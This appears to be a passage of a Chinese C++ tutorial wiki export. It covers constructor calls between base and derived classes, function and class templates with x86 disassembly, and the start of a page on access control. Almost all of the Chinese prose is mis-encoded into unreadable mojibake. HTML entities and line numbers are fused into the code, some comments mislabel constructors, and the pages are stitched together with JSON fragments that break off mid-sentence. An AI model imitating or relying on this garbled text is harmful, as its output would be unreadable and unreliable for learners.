è™šç»§æ‰¿ï¼Œåé¢ä¼°è®¡ä¼šè®² å­ç±»æ— æ„é€ å‡½æ•°å­ç±»å®šä¹‰äº†æ„é€ å‡½æ•°ï¼ˆæ— å‚æˆ–æœ‰å‚ï¼‰çˆ¶ç±»åªæœ‰å¸¦å‚æ•°æ„é€ å‡½æ•°çˆ¶ç±»åªæœ‰å¸¦å‚æ•°æ„é€ å‡½æ•°æ—¶çš„å­ç±»æ„é€ å‡½æ•° æ„é€ å‡½æ•°æƒ…å†µ çˆ¶ç±» åªæœ‰æ— å‚æ•°æ„é€ å‡½æ•°ï¼ˆæ˜¾å¼å†™æ˜æˆ–ç¼–è¯‘å™¨è‡ªåŠ¨åŠ çš„ï¼‰ å­ç±» æ²¡æœ‰å®šä¹‰ä»»ä½•æ„é€ å‡½æ•° å­ç±»å¯¹è±¡å®ä¾‹åŒ–ï¼šå­ç±»çš„æ„é€ å‡½æ•°ä¼šï¼Œè‡ªåŠ¨è°ƒç”¨çˆ¶ç±»çš„æ— å‚æ•°æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–ç»§æ‰¿çš„æˆå‘˜ 12345678910111213141516171819202122232425class Base&#123;private: int x;public: Base() // çˆ¶ç±»çš„æ— å‚æ„é€ å‡½æ•° &#123; &#125;&#125;;class Derived : public Base&#123;private: int y; // æ²¡æœ‰æ„é€ å‡½æ•°&#125;;int main()&#123; Derived d; // å­ç±»çš„æ— å‚æ„é€ ä¼šè°ƒç”¨Baseçš„é»˜è®¤æ— å‚æ„é€ å‡½æ•° return 0;&#125; æ„é€ å‡½æ•°æƒ…å†µ çˆ¶ç±» åªæœ‰æ— å‚æ•°æ„é€ å‡½æ•°ï¼ˆæ˜¾å¼å†™æ˜æˆ–ç¼–è¯‘å™¨è‡ªåŠ¨åŠ çš„ï¼‰ å­ç±» å®šä¹‰äº†æ„é€ å‡½æ•°ï¼ˆæ— å‚æˆ–æœ‰å‚ï¼‰ å­ç±»ç”¨æ— å‚æ„é€ å‡½æ•°å®ä¾‹åŒ–ï¼šå­ç±»çš„æ— å‚æ„é€ å‡½æ•°ä¼šè°ƒç”¨çˆ¶ç±»çš„æ— å‚constructor å­ç±»ç”¨å¸¦å‚æ„é€ å‡½æ•°å®ä¾‹åŒ–ï¼šå­ç±»çš„å¸¦å‚æ„é€ å‡½æ•°ä¼šè°ƒç”¨çˆ¶ç±»çš„æ— å‚constructor 12345678910111213141516171819202122232425262728293031323334class Base&#123;private: int x;public: Base() // çˆ¶ç±»çš„æ— å‚æ„é€ å‡½æ•° &#123; this-&gt;x = 0; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived() // å­ç±»çš„æ— å‚æ„é€ å‡½æ•° &#123; &#125; Derived(int y) // å­ç±»çš„æœ‰å‚æ„é€ å‡½æ•° &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d1; // å­ç±»çš„æ— å‚æ„é€ å‡½æ•°ä¼šè°ƒç”¨çˆ¶ç±»çš„æ— å‚constructor Derived d2(2); // å­ç±»çš„å¸¦å‚æ„é€ å‡½æ•°ä¼šè°ƒç”¨çˆ¶ç±»çš„æ— å‚constructor return 0;&#125; Derived d1Derived d2(2) æ„é€ å‡½æ•°æƒ…å†µ çˆ¶ç±» åªæœ‰å¸¦å‚æ„é€ å‡½æ•° å­ç±» å®šä¹‰äº†æ„é€ å‡½æ•°ï¼ˆæ— å‚æˆ–æœ‰å‚ï¼‰ çˆ¶ç±»å†™äº†å¸¦å‚æ„é€ å‡½æ•°ï¼Œæ²¡å†™æ— å‚æ„é€ å‡½æ•°ã€‚ å­ç±»çš„æ„é€ å‡½æ•°çš„initializationæ²¡æœ‰æ˜¾å¼è°ƒç”¨çˆ¶ç±»å¸¦å‚æ„é€ å‡½æ•°ï¼Œç¼–è¯‘ä¼šå‡ºé”™ï¼šæ‰¾ä¸åˆ°æ— å‚æ„é€ å‡½æ•°ã€‚ å› ä¸ºå­ç±»å¯¹è±¡å®ä¾‹åŒ–æ—¶ä¼šé»˜è®¤æ‰¾Baseçš„æ— å‚æ„é€ å‡½æ•°ï¼Œè€ŒBaseåˆåªå†™äº†å¸¦å‚æ„é€ å‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334class Base&#123;private: int x;public: // æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° Base(int x) // çˆ¶ç±»çš„å¸¦å‚æ„é€ å‡½æ•° &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived() // å­ç±»çš„æ— å‚æ„é€ å‡½æ•° &#123; &#125; Derived(int y) // å­ç±»çš„æœ‰å‚æ„é€ å‡½æ•° &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d2(2); // å­ç±»çš„å¸¦å‚æ„é€ å‡½æ•°ä¼šè°ƒç”¨çˆ¶ç±»çš„æ— å‚constructorï¼Œä½†æ‰¾ä¸åˆ°ï¼Œç¼–è¯‘æŠ¥é”™ return 0;&#125; Derived()å’ŒDerived(int y)ä¸¤ä¸ªéƒ½è¦è°ƒBase()ï¼Œæ‰€ä»¥ç¼–è¯‘æŠ¥é”™æ˜¯ä¸¤æ¡ è§£å†³åŠæ³•ï¼š BaseåŠ ä¸Šæ— å‚æ„é€ å‡½æ•° å­ç±»æ„é€ å‡½æ•°initializationæŒ‡æ˜è°ƒç”¨çˆ¶ç±»å¸¦å‚æ„é€ å‡½æ•° BaseåŠ ä¸Šæ— å‚æ„é€ å‡½æ•°å­ç±»æ„é€ å‡½æ•°initializationæ˜¾ç¤ºè°ƒç”¨çˆ¶ç±»å¸¦å‚æ„é€ å‡½æ•°123456789101112131415161718192021222324252627282930313233343536class Base&#123;private: int x;public: Base() // çˆ¶ç±»çš„æ— å‚æ„é€ å‡½æ•° &#123; &#125; Base(int x) // çˆ¶ç±»çš„å¸¦å‚æ„é€ å‡½æ•° &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived() // å­ç±»çš„æ— å‚æ„é€ å‡½æ•° &#123; &#125; Derived(int y) // å­ç±»çš„æœ‰å‚æ„é€ å‡½æ•° &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d2(2); // å­ç±»çš„å¸¦å‚æ„é€ å‡½æ•°ä¼šè°ƒç”¨çˆ¶ç±»çš„æ— å‚constructor return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435class Base&#123;private: int x;public: // æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° Base(int x) // çˆ¶ç±»çš„å¸¦å‚æ„é€ å‡½æ•° &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x) : Base(x) // å­ç±»çš„æ— å‚æ„é€ å‡½æ•° &#123; &#125; Derived(int x, int y) : Base(x) // å­ç±»çš„æœ‰å‚æ„é€ å‡½æ•° &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d1(1); // å­ç±»çš„å¸¦å‚æ„é€ å‡½æ•°ä¼šè°ƒç”¨çˆ¶ç±»çš„æœ‰å‚constructorï¼ˆæ˜¾ç¤ºæŒ‡æ˜äº†ï¼‰ Derived d2(1, 2); // å­ç±»çš„å¸¦å‚æ„é€ å‡½æ•°ä¼šè°ƒç”¨çˆ¶ç±»çš„æœ‰å‚constructorï¼ˆæ˜¾ç¤ºæŒ‡æ˜äº†ï¼‰ return 0;&#125;è™šç»§æ‰¿ä¸­çš„æ„é€ å‡½æ•°è°ƒç”¨ å°ç»“ å­ç±»å¯¹è±¡å®ä¾‹åŒ–æ—¶ï¼Œå­ç±»æ„é€ å‡½æ•°é‡Œä¼šè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼ˆåªæœ‰åœ¨initializationä¸­èƒ½ä¿®æ”¹è°ƒçˆ¶ç±»çš„å“ªä¸ªæ„é€ å‡½æ•°ï¼‰ å¦‚æœinitializationæœ‰æ˜¾ç¤ºè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå°±ä¼šå…ˆè°ƒç”¨initializationä¸­æŒ‡æ˜çš„çˆ¶ç±»æ„é€ å‡½æ•° å¦‚æœæ²¡æ˜¾ç¤ºè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨å°±ä¼šé»˜è®¤è°ƒç”¨çˆ¶ç±»æ— å‚æ„é€ å‡½æ•° å¦‚æœçˆ¶ç±»å†™äº†å¸¦å‚æ„é€ å‡½æ•°ï¼Œæ²¡å£°æ˜æ— å‚æ„é€ å‡½æ•°ï¼Œç¼–è¯‘ä¼šæŠ¥é”™ å¦‚æœçˆ¶ç±»å†™äº†æ— å‚æ„é€ å‡½æ•°ï¼Œæˆ–æ²¡å†™ï¼ˆç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åŠ ä¸Šï¼‰ï¼Œè¿è¡Œæ­£å¸¸ å¥½ä¹ æƒ¯ï¼šæ¯å†™ä¸€ä¸ªç±»ï¼Œå°±æŠŠæ— å‚æ„é€ å‡½æ•°å†™ä¸Šï¼Œé¿å…æ— è°“çš„ç¼–è¯‘é”™è¯¯ æ˜¾ç¤ºè°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ä¸ºä»€ä¹ˆåªèƒ½æ”¾initializationä¸­ é”™è¯¯çš„ï¼Œæ”¾å­ç±»æ„é€ å‡½æ•°ä½“ä½“ä¸­æ­£ç¡®çš„ï¼Œæ”¾initializationä¸­12345678910111213141516171819202122232425262728293031323334class Base&#123;private: int x;public: Base() // çˆ¶ç±»çš„æ— å‚æ„é€ å‡½æ•° &#123; &#125; Base(int x) // çˆ¶ç±»çš„å¸¦å‚æ„é€ å‡½æ•° &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x, int y) &#123; Base::Base(x); this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d1(1, 2); return 0;&#125; å¯ä»¥å‘ç°é—®é¢˜ï¼š è¿˜æ˜¯é»˜è®¤è°ƒç”¨äº†çˆ¶ç±»Baseæ— å‚çš„æ„é€ å‡½æ•° Base::Base(x)ä¼ å‚çš„æ˜¯ä¸ªä¸´æ—¶å¯¹è±¡[ebp-8]ï¼ˆè€Œä¸æ˜¯d1å¯¹è±¡çš„thisæŒ‡é’ˆï¼‰ï¼Œæ ¹æœ¬æ²¡æ”¹åˆ°d1å¯¹è±¡çš„xçš„å€¼ï¼Œå½“Derivedå‡½æ•°è°ƒç”¨å®Œæ¯•ï¼Œè¿™ä¸ªä¸´æ—¶å¯¹è±¡å°±è¢«é‡Šæ”¾äº† 12345678910111213141516171819202122232425262728293031323334class Base&#123;private: int x;public: Base() // çˆ¶ç±»çš„æ— å‚æ„é€ å‡½æ•° &#123; &#125; Base(int x) // çˆ¶ç±»çš„å¸¦å‚æ„é€ å‡½æ•° &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x, int y) : Base(x) // å­ç±»çš„æœ‰å‚æ„é€ å‡½æ•° &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d1(1, 2); // å­ç±»çš„å¸¦å‚æ„é€ å‡½æ•°ä¼šè°ƒç”¨çˆ¶ç±»çš„æœ‰å‚constructorï¼ˆæ˜¾ç¤ºæŒ‡æ˜äº†ï¼‰ return 0;&#125; d1å¯¹è±¡å®ä¾‹åŒ–æ—¶è°ƒç”¨å­ç±»çš„æœ‰å‚æ„é€ å‡½æ•°ä¼ äº†ä¸‰ä¸ªå‚æ•°ï¼š2ï¼Œ1ï¼Œd1å¯¹è±¡çš„thisæŒ‡é’ˆ è°ƒç”¨Baseå¸¦å‚æ„é€ å‡½æ•°æ—¶ä¼ äº†ä¸¤ä¸ªå‚æ•°ï¼š1ï¼Œd1å¯¹è±¡çš„thisæŒ‡é’ˆ Baseå¸¦å‚æ„é€ å‡½æ•°ä¸­é€šè¿‡d1å¯¹è±¡çš„thisæŒ‡é’ˆå°†æˆå‘˜xèµ‹å€¼ä¸º1"},{"title":"æ¨¡æ¿","path":"/wiki/C++/æ¨¡æ¿.html","content":"å‰è¨€ å‡è®¾å†™äº†ä¸€ä¸ªé’ˆå¯¹intç±»å‹æ•°ç»„çš„å†’æ³¡æ’åºï¼Œç°åœ¨ä¹Ÿæƒ³è®©è¿™ä¸ªå†’æ³¡æ’åºå¯¹charç±»å‹æ•°ç»„ä¹Ÿèƒ½ç”¨ã€‚ä¸¤ä»½ä»£ç é€»è¾‘ä¸Šä¸€æ ·ï¼Œåªæ˜¯æ•°æ®ç±»å‹ä¸ä¸€æ ·ã€‚è¿™ä¹Ÿæ˜¯ç›¸åŒçš„è½®å­ï¼Œé‡å¤çš„ä»£ç ã€‚å¦‚ä½•å‡å°‘é‡å¤é€ è½®å­çš„å·¥ä½œï¼Œç­”æ¡ˆæ˜¯æ¨¡æ¿ é’ˆå¯¹intç±»å‹æ•°æ®çš„å†’æ³¡æ’åºé’ˆå¯¹charç±»å‹æ•°æ®çš„å†’æ³¡æ’åº123456789101112131415161718192021222324void Sort(int* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; int temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; int iarr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(iarr, 7); return 0;&#125;123456789101112131415161718192021222324void Sort(char* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; char temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; char carr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(carr, 7); return 0;&#125; å‡½æ•°æ¨¡æ¿ è¯­æ³•æ ¼å¼ ä»C++98æ ‡å‡†å¼€å§‹ï¼Œå¯ä»¥ç”¨typenameå…³é”®å­—æ¥å£°æ˜æ¨¡æ¿å‚æ•°ï¼Œä½œä¸ºclassçš„ä¸€ä¸ªå¯æ›¿ä»£é€‰é¡¹ï¼Œä¸ºäº†ä½¿è¯­ä¹‰æ›´æ¸…æ™°å’Œæ›´å‡†ç¡® å†™æ³•ä¸€å†™æ³•ä¸€å»ºè®®ç”¨å†™æ³•ä¸€ï¼Œå¯è¯»æ€§æ›´å¥½ 12345template&lt;class å½¢å‚å, class å½¢å‚å, ...&gt;è¿”å›ç±»å‹ å‡½æ•°å(å‚æ•°åˆ—è¡¨) &#123; å‡½æ•°ä½“;&#125;1234template&lt;class å½¢å‚å, class å½¢å‚å, ...&gt; è¿”å›ç±»å‹ å‡½æ•°å(å‚æ•°åˆ—è¡¨) &#123; å‡½æ•°ä½“;&#125; ä¾‹1ï¼šé’ˆå¯¹åŸºæœ¬æ•°æ®ç±»å‹çš„æ¨¡æ¿ åœ¨å‡½æ•°å‰åŠ ä¸Štemplateï¼Œå½¢å‚åæ˜¯è‡ªå·±èµ·çš„ä¸€ä¸ªåå­—ï¼Œå°†éœ€è¦å˜åŒ–çš„æ•°æ®ç±»å‹æ›¿æ¢ä¸ºå½¢å‚åï¼Œç¼–è¯‘å™¨åœ¨å‡½æ•°æ¨¡æ¿å®ä¾‹åŒ–æ—¶ä¼šå¸®æˆ‘ä»¬æ›¿æ¢å¥½ã€‚å¦‚æ­¤ï¼ŒSortå‡½æ•°å°±æ”¯æŒä»»æ„æ•°æ®ç±»å‹çš„æ•°ç»„äº†ã€‚å¦‚æœæ²¡æœ‰æ¨¡æ¿ï¼Œéœ€è¦æ‰‹åŠ¨å†™å¾ˆå¤šä¸ªSortï¼Œå®ƒä»¬ä»…ä»…æ˜¯æ¢äº†æ•°æ®ç±»å‹ï¼Œæ¯”å¦‚ä¸€ä¸ªé’ˆå¯¹intç±»å‹æ•°ç»„ï¼Œä¸€ä¸ªé’ˆå¯¹charç±»å‹æ•°ç»„ã€‚ 12345678910111213141516171819202122232425262728template&lt;class T&gt;void Sort(T* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; T temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; int iarr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(iarr, 7); //intç±»å‹çš„Sortå‡½æ•°å®ä¾‹åŒ– char carr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(carr, 7); //charç±»å‹çš„Sortå‡½æ•°å®ä¾‹åŒ– return 0;&#125; ä¾‹2ï¼šé’ˆå¯¹è‡ªå®šä¹‰æ•°æ®ç±»å‹çš„æ¨¡æ¿ å°†å†’æ³¡æ’åºç”¨äºè‡ªå·±å®šä¹‰çš„ç±»ã€‚ä¸¤ä¸ªç±»çš„æ¯”è¾ƒï¼Œç±»&gt;ç±»ï¼Œç¼–è¯‘å™¨æ— æ³•ç†è§£&gt;è¿™ä¸ªç¬¦å·ï¼Œæ‰€ä»¥éœ€è¦å¯¹&gt;é‡è½½è¿ç®—ç¬¦ 1234567891011121314151617181920212223242526272829303132333435363738394041class Base&#123;private: int x; int y;public: Base(int x, int y) : x(x), y(y) &#123;&#125; bool operator&gt;(Base &amp;b) // é‡è½½&gt;è¿ç®—ç¬¦ &#123; return this-&gt;x &gt; b.x &amp;&amp; this-&gt;y &gt; b.y; // ä¸¤ä¸ªéƒ½å¤§ï¼Œå°±ç®—è¿™ä¸ªç±»å¤§ &#125;&#125;;template &lt;class T&gt;void Sort(T* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; T temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; Base b1(1, 1), b2(3, 3), b3(2, 2), b4(5, 5), b5(4, 4); Base barr3[] = &#123;b1, b2, b3, b4, b5&#125;; Sort(barr3, 5); //å‡½æ•°æ¨¡æ¿å®ä¾‹åŒ– return 0;&#125; å‡½æ•°æ¨¡æ¿çš„æœ¬è´¨ å›åˆ°ä¸Šé¢çš„ä¾‹1 å‡½æ•°æ¨¡æ¿å¹¶æ²¡æœ‰åˆ›å»ºå‡½æ•°ï¼Œåªæœ‰å½“è°ƒç”¨æ—¶ï¼ŒçŸ¥é“äº†ç”¨å“ªä¸ªå…·ä½“ç±»å‹è¿›è¡Œæ›¿æ¢ï¼Œç¼–è¯‘å™¨å°±ä¼šå¸®æˆ‘ä»¬å†™ä¸€ä»½è¿™ä¸ªç±»å‹çš„å‡½æ•°ã€‚ åæ±‡ç¼–çœ‹åˆ°å¯¹intæ•°æ®çš„Sortå‡½æ•°å‡½æ•°åœ°å€åœ¨ï¼š0040100a åæ±‡ç¼–çœ‹åˆ°å¯¹charæ•°æ®çš„Sortå‡½æ•°å‡½æ•°åœ°å€åœ¨ï¼š00401005 è¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„å‡½æ•° ä¹Ÿå°±æ˜¯è¯´ï¼Œç¼–è¯‘å™¨ä¼šåœ¨çŸ¥é“å…·ä½“ä¼ å…¥ç±»å‹æ—¶æ›¿æˆ‘ä»¬æ¥å†™è¿™ä¸ªå‡½æ•°ã€‚ ç”¨å‡½æ•°æ¨¡æ¿ç”Ÿæˆçš„å¯¹intç±»å‹æ•°æ®çš„Sortå‡½æ•°ï¼Œå…¶åæ±‡ç¼–å’Œç›´æ¥å†™çš„void Sort(int* arr, int nLength)æ˜¯ä¸€æ ·çš„ ç›´æ¥å†™çš„int_Sorttemplateç”Ÿæˆçš„int_Sort123456789101112131415161718192021222324void Sort(int* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; int temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; int iarr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(iarr, 7); return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172731: void Sort(int* arr, int nLength)2: &#123;0040D3F0 push ebp0040D3F1 mov ebp,esp0040D3F3 sub esp,4Ch0040D3F6 push ebx0040D3F7 push esi0040D3F8 push edi0040D3F9 lea edi,[ebp-4Ch]0040D3FC mov ecx,13h0040D401 mov eax,0CCCCCCCCh0040D406 rep stos dword ptr [edi]3: int i, k;4: for (i = 0; i &lt; nLength; i++)0040D408 mov dword ptr [ebp-4],00040D40F jmp Sort+2Ah (0040d41a)0040D411 mov eax,dword ptr [ebp-4]0040D414 add eax,10040D417 mov dword ptr [ebp-4],eax0040D41A mov ecx,dword ptr [ebp-4]0040D41D cmp ecx,dword ptr [ebp+0Ch]0040D420 jge Sort+97h (0040d487)5: &#123;6: for (k = 0; k &lt; nLength - 1 - i; k++)0040D422 mov dword ptr [ebp-8],00040D429 jmp Sort+44h (0040d434)0040D42B mov edx,dword ptr [ebp-8]0040D42E add edx,10040D431 mov dword ptr [ebp-8],edx0040D434 mov eax,dword ptr [ebp+0Ch]0040D437 sub eax,10040D43A sub eax,dword ptr [ebp-4]0040D43D cmp dword ptr [ebp-8],eax0040D440 jge Sort+95h (0040d485)7: &#123;8: if (arr[k] &gt; arr[k + 1])0040D442 mov ecx,dword ptr [ebp-8]0040D445 mov edx,dword ptr [ebp+8]0040D448 mov eax,dword ptr [ebp-8]0040D44B mov esi,dword ptr [ebp+8]0040D44E mov ecx,dword ptr [edx+ecx*4]0040D451 cmp ecx,dword ptr [esi+eax*4+4]0040D455 jle Sort+93h (0040d483)9: &#123;10: int temp = arr[k];0040D457 mov edx,dword ptr [ebp-8]0040D45A mov eax,dword ptr [ebp+8]0040D45D mov ecx,dword ptr [eax+edx*4]0040D460 mov dword ptr [temp],ecx11: arr[k] = arr[k + 1];0040D463 mov edx,dword ptr [ebp-8]0040D466 mov eax,dword ptr [ebp+8]0040D469 mov ecx,dword ptr [ebp-8]0040D46C mov esi,dword ptr [ebp+8]0040D46F mov ecx,dword ptr [esi+ecx*4+4]0040D473 mov dword ptr [eax+edx*4],ecx12: arr[k + 1] = temp;0040D476 mov edx,dword ptr [ebp-8]0040D479 mov eax,dword ptr [ebp+8]0040D47C mov ecx,dword ptr [temp]0040D47F mov dword ptr [eax+edx*4+4],ecx13: &#125;14: &#125;0040D483 jmp Sort+3Bh (0040d42b)15: &#125;0040D485 jmp Sort+21h (0040d411)16: &#125;0040D487 pop edi0040D488 pop esi0040D489 pop ebx0040D48A mov esp,ebp0040D48C pop ebp0040D48D ret1234567891011121314151617181920212223242526template&lt;class T&gt;void Sort(T* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; T temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; int iarr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(iarr, 7); //intç±»å‹çš„Sortå‡½æ•°å®ä¾‹åŒ– return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273741: template&lt;class T&gt;2: void Sort(T* arr, int nLength)3: &#123;004010F0 push ebp004010F1 mov ebp,esp004010F3 sub esp,4Ch004010F6 push ebx004010F7 push esi004010F8 push edi004010F9 lea edi,[ebp-4Ch]004010FC mov ecx,13h00401101 mov eax,0CCCCCCCCh00401106 rep stos dword ptr [edi]4: int i, k;5: for (i = 0; i &lt; nLength; i++)00401108 mov dword ptr [ebp-4],00040110F jmp Sort+2Ah (0040111a)00401111 mov eax,dword ptr [ebp-4]00401114 add eax,100401117 mov dword ptr [ebp-4],eax0040111A mov ecx,dword ptr [ebp-4]0040111D cmp ecx,dword ptr [ebp+0Ch]00401120 jge Sort+97h (00401187)6: &#123;7: for (k = 0; k &lt; nLength - 1 - i; k++)00401122 mov dword ptr [ebp-8],000401129 jmp Sort+44h (00401134)0040112B mov edx,dword ptr [ebp-8]0040112E add edx,100401131 mov dword ptr [ebp-8],edx00401134 mov eax,dword ptr [ebp+0Ch]00401137 sub eax,10040113A sub eax,dword ptr [ebp-4]0040113D cmp dword ptr [ebp-8],eax00401140 jge Sort+95h (00401185)8: &#123;9: if (arr[k] &gt; arr[k + 1])00401142 mov ecx,dword ptr [ebp-8]00401145 mov edx,dword ptr [ebp+8]00401148 mov eax,dword ptr [ebp-8]0040114B mov esi,dword ptr [ebp+8]0040114E mov ecx,dword ptr [edx+ecx*4]00401151 cmp ecx,dword ptr [esi+eax*4+4]00401155 jle Sort+93h (00401183)10: &#123;11: T temp = arr[k];00401157 mov edx,dword ptr [ebp-8]0040115A mov eax,dword ptr [ebp+8]0040115D mov ecx,dword ptr [eax+edx*4]00401160 mov dword ptr [temp],ecx12: arr[k] = arr[k + 1];00401163 mov edx,dword ptr [ebp-8]00401166 mov eax,dword ptr [ebp+8]00401169 mov ecx,dword ptr [ebp-8]0040116C mov esi,dword ptr [ebp+8]0040116F mov ecx,dword ptr [esi+ecx*4+4]00401173 mov dword ptr [eax+edx*4],ecx13: arr[k + 1] = temp;00401176 mov edx,dword ptr [ebp-8]00401179 mov eax,dword ptr [ebp+8]0040117C mov ecx,dword ptr [temp]0040117F mov dword ptr [eax+edx*4+4],ecx14: &#125;15: &#125;00401183 jmp Sort+3Bh (0040112b)16: &#125;00401185 jmp Sort+21h (00401111)17: &#125;00401187 pop edi00401188 pop esi00401189 pop ebx0040118A mov esp,ebp0040118C pop ebp0040118D ret ç»“æ„ä½“/ç±»æ¨¡æ¿ è¯­æ³•æ ¼å¼ å†™æ³•ä¸€å†™æ³•ä¸€å»ºè®®ç”¨å†™æ³•ä¸€ï¼Œå¯è¯»æ€§æ›´å¥½ 1234template&lt;class å½¢å‚å, class å½¢å‚å, ...&gt;class ç±»å &#123; ...;&#125;1234template&lt;class å½¢å‚å, class å½¢å‚å, ...&gt; class ç±»å &#123; ...;&#125; æ¨¡æ¿åŒ–å‰çš„ç±»æ”¹å†™åçš„ç±»æ¨¡æ¿Baseç±»åªæ”¯æŒintå’Œcharç±»å‹ 1234567891011121314151617181920class Base&#123;public: int a; int b; char x; char y;public: int Max() &#123; return a &gt; b ? a : b; &#125; char Min() &#123; return x &gt; y ? y : x; &#125;&#125;;ç°åœ¨Baseç±»æ”¯æŒä»»æ„ä¸¤ç§æ•°æ®ç±»å‹äº† 123456789101112131415161718192021222324252627282930313233343536373839template &lt;class T, class M&gt;class Base&#123;public: T a; T b; M x; M y;public: T Max() &#123; return a &gt; b ? a : b; &#125; M Min() &#123; return x &gt; y ? y : x; &#125;&#125;;int main()&#123; // Base b; //ç¼–è¯‘æŠ¥é”™ï¼Œå› ä¸ºç¼–è¯‘å™¨ä¸çŸ¥é“Tå’ŒMæ›¿æ¢ä¸ºä»€ä¹ˆç±»å‹ Base&lt;int, char&gt; b; // éœ€è¦å‘ŠçŸ¥ç¼–è¯‘å™¨æ¨¡æ¿ä¸­çš„Tã€Mç”¨ä»€ä¹ˆæ•°æ®ç±»å‹æ›¿æ¢ b.a = 1; b.b = 2; b.x = 3; b.y = 4; int r1 = b.Max(); char r2 = b.Min(); return 0;&#125; å†™ä»£ç æ—¶ä¼šå‘ç°ï¼Œç¼–è¯‘å™¨çŸ¥é“Maxçš„è¿”å›ç±»å‹ç°åœ¨æ˜¯intç±»å‹ å°ç»“ ç»§æ‰¿æ˜¯æ•°æ®çš„å¤åˆ¶ æ¨¡ç‰ˆæ˜¯ä»£ç çš„å¤åˆ¶"},{"title":"ç±»æˆå‘˜çš„è®¿é—®æ§åˆ¶","path":"/wiki/C++/ç±»æˆå‘˜çš„è®¿é—®æ§åˆ¶.html","content":"è‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ è‰¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯ï¼šå®šä¹‰å’Œå®ç°åˆ†å¼€åœ¨ä¸åŒçš„æ–‡ä»¶ï¼Œè¿™æ ·ä¼šæœ‰æ›´å¥½çš„å¯è¯»æ€§ Test.hTest.cppmain.cpp123456789struct Test&#123; int x; int y; int Bigger(int x, int y); int Max(int x, int y, int z);&#125;;123456789101112131415161718#include &quot;Test.h&quot;int Test::Bigger(int x, int y) //è¡¨æ˜æ˜¯Testç±»é‡Œçš„Biggerå‡½æ•°ï¼Œè€Œä¸æ˜¯å…¨å±€çš„Biggerå‡½æ•°&#123; if (x &gt; y) &#123; return x; &#125; else &#123; return y; &#125;&#125;int Test::Max(int x, int y, int z) //è¡¨æ˜æ˜¯Testç±»é‡Œçš„Maxå‡½æ•°ï¼Œè€Œä¸æ˜¯å…¨å±€çš„Biggerå‡½æ•°&#123; return Bigger(Bigger(x, y), z);&#125;12345678910#include &quot;Test.h&quot;#include &lt;stdio.h&gt;int main()&#123; Test a; int r = a.Max(1, 2, 3); return 0;&#125; è®¿é—®æ§åˆ¶ å‰è¨€ å‡è®¾åœ¨å¤šäººå›¢é˜Ÿå¼€å‘çš„åœºæ™¯ä¸‹ï¼Œå°æ˜æä¾›äº†ä¸Šé¢ä¾‹å­çš„Test.hå’ŒTest.cppç»™å°ç‹ç”¨ã€‚å°ç‹å¼€å¿ƒåœ°åœ¨mainå‡½æ•°ä¸­#include 